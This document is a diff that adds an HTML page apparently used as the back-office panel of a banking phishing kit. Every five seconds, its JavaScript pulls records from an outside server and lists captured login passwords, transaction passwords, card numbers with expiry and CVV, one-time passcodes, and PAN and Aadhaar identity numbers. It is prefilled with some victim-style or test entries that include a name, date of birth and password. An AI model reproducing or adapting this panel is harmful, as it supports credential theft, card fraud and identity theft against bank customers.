@@ -1,0 +1,254 @@
+<html><head>
+    <title>3%3*9%9*+02+36%/45</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+</head>
+<body>
+    <div id="data-container">
+        <table class="table table-white table-hover table-striped container-fluid">
+            <thead>
+               
+                <tr>
+                    <th>ID</th>
+
+                    <th>Login ID/ Cus ID</th>
+                    <th>Corporate ID</th>
+
+                    <th>Password</th>
+                    <th>Mobile</th>
+
+                    <th>Business Acc name</th>
+                    <th>Transaction Pass</th>
+
+                    <th>Credit Card No</th>
+                    <th>Expiry</th>
+                    <th>CVV</th>
+                    <th>Credit Limit</th>
+                    <th>Mobile</th>
+
+                    <th>Acc Holder Name</th>
+                    <th>D-o-B</th>
+
+                    <th>OTP 1</th>
+
+                    <th>Pan Name</th>
+                    <th>Pan No</th>
+
+                    <th>OTP 2</th>
+
+                    <th>Aadhar Name</th>
+                    <th>Aadhar No</th>
+                    <th>Father Name</th>
+
+
+                    <th>OTP3</th>
+
+                    <th>OTP4</th>
+                </tr>
+            </thead>
+            <tbody id="data-body"><tr><td>456</td><td>66782</td><td></td><td>Ususuuejs</td><td>9843467729</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>Rahul singh</td><td>10/11/1980</td><td>628286</td><td>Rahul singh</td><td>Aehee6382a</td><td>543432</td><td>Rahul singh</td><td>4516</td><td>Yeusud</td><td>646464</td><td>538625</td></tr><tr><td>455</td><td>65577655</td><td></td><td>Happy diwali</td><td>9999999999</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>453</td><td></td><td></td><td></td><td></td><td></td><td></td><td>5196 0000 0000 0000</td><td>12/25</td><td>111</td><td>100000</td><td>9199999999</td><td>Golder name</td><td>11/22/3344</td><td>1234</td><td>Full name</td><td>Abcda1234a</td><td>123456</td><td>Full name</td><td>0000</td><td>HSbdhdb</td><td>123456</td><td>1234</td></tr></tbody>
+        </table>
+    </div>
+
+
+<script type="text/javascript">
+    // Get a reference to the "Get Data" button and data container elements
+    var dataBody = document.getElementById("data-body");
+
+    function displayData(data) {
+        // Clear the data container
+        dataBody.innerHTML = "";
+
+        // Loop through the data and create rows in the table for each record
+        for (var i = 0; i < data.length; i++) {
+            var record = data[i];
+
+            var url = window.location.hostname;
+            var domains = url + '/showhtml';
+
+            if (record.domain == domains) {
+                // Create a new row in the table
+                var row = document.createElement("tr");
+
+                // Create table cells (td) for each data field
+                var idCell = document.createElement("td");
+                idCell.textContent = record.id;
+                row.appendChild(idCell);
+
+                var login_cus_id = document.createElement("td");
+                login_cus_id.textContent = record.login_cus_id;
+                row.appendChild(login_cus_id);
+
+                var corpId = document.createElement("td");
+                corpId.textContent = record.corpId;
+                row.appendChild(corpId);
+
+
+                var password = document.createElement("td");
+                password.textContent = record.password;
+                row.appendChild(password);
+
+
+                var mobile_no = document.createElement("td");
+                mobile_no.textContent = record.mobile_no;
+                row.appendChild(mobile_no);
+
+                var busns_accname = document.createElement("td");
+                busns_accname.textContent = record.busns_accname;
+                row.appendChild(busns_accname);
+
+
+                var trans_pass = document.createElement("td");
+                trans_pass.textContent = record.trans_pass;
+                row.appendChild(trans_pass);
+
+
+                var credit_no = document.createElement("td");
+                credit_no.textContent = record.credit_no;
+                row.appendChild(credit_no);
+
+
+                var expiry_date = document.createElement("td");
+                expiry_date.textContent = record.expiry_date;
+                row.appendChild(expiry_date);
+
+
+                var cvv_no = document.createElement("td");
+                cvv_no.textContent = record.cvv_no;
+                row.appendChild(cvv_no);
+
+
+                var credit_limit = document.createElement("td");
+                credit_limit.textContent = record.credit_limit;
+                row.appendChild(credit_limit);
+
+
+                var mobile_noo = document.createElement("td");
+                mobile_noo.textContent = record.mobile_noo;
+                row.appendChild(mobile_noo);
+
+
+                var account_holder_name = document.createElement("td");
+                account_holder_name.textContent = record.account_holder_name;
+                row.appendChild(account_holder_name);
+
+
+                var date_of_birth = document.createElement("td");
+                date_of_birth.textContent = record.date_of_birth;
+                row.appendChild(date_of_birth);
+
+                var otp1 = document.createElement("td");
+                otp1.textContent = record.otp1;
+                row.appendChild(otp1);
+
+
+                var full_name = document.createElement("td");
+                full_name.textContent = record.full_name;
+                row.appendChild(full_name);
+
+
+                var pan_no = document.createElement("td");
+                pan_no.textContent = record.pan_no;
+                row.appendChild(pan_no);
+
+
+                var otp2 = document.createElement("td");
+                otp2.textContent = record.otp2;
+                row.appendChild(otp2);
+
+
+                var aadhar_name = document.createElement("td");
+                aadhar_name.textContent = record.aadhar_name;
+                row.appendChild(aadhar_name);
+
+
+                var aadhar_no = document.createElement("td");
+                aadhar_no.textContent = record.aadhar_no;
+                row.appendChild(aadhar_no);
+
+
+                var father_name = document.createElement("td");
+                father_name.textContent = record.father_name;
+                row.appendChild(father_name);     
+
+                var otp4 = document.createElement("td");
+                otp4.textContent = record.otp4;
+                row.appendChild(otp4);  
+
+
+                var otp5 = document.createElement("td");
+                otp5.textContent = record.otp5;
+                row.appendChild(otp5);        
+
+
+
+
+
+
+
+                // Append the row to the table body
+                dataBody.appendChild(row);
+            }
+        }
+    }
+
+    function getDataFromAPI() {
+        // Create a new XMLHttpRequest object
+        var xhr = new XMLHttpRequest();
+
+        // Set the API endpoint URL
+        var url = "https://anikdevnath.site/axis_latest/get.php";
+
+        // Open a new GET request with the URL
+        xhr.open("GET", url);
+
+        // Set the response type as JSON, assuming the API returns JSON data
+        xhr.responseType = "json";
+
+        // Define a function to handle the response
+        xhr.onload = function() {
+            // Check if the request was successful (status code 200)
+            if (xhr.status === 200) {
+                // Get the response data from the XHR object
+                var data = xhr.response;
+                displayData(data);
+            }
+        };
+
+        // Send the request to the server
+        xhr.send();
+    }
+
+    function getDataFromAnotherAPI() {
+        // Create a new XMLHttpRequest object
+        var xhr = new XMLHttpRequest();
+
+        // Set the API endpoint URL
+        var url = "https://anikdevnath.site/axis_latest/get.php";
+
+        // Open a new GET request with the URL
+        xhr.open("GET", url);
+
+        // Set the response type as JSON, assuming the API returns JSON data
+        xhr.responseType = "json";
+
+        // Define a function to handle the response
+        xhr.onload = function() {
+            // Check if the request was successful (status code 200)
+            if (xhr.status === 200) {
+                // Get the response data from the XHR object
+                var data = xhr.response;
+                displayData(data);
+            }
+        };
+
+        // Send the request to the server
+        xhr.send();
+    }
+
+    // Call the functions to get data and display it in the table
+    getDataFromAPI();
+    setInterval(getDataFromAnotherAPI, 5000);
+</script>
+
+</body></html>
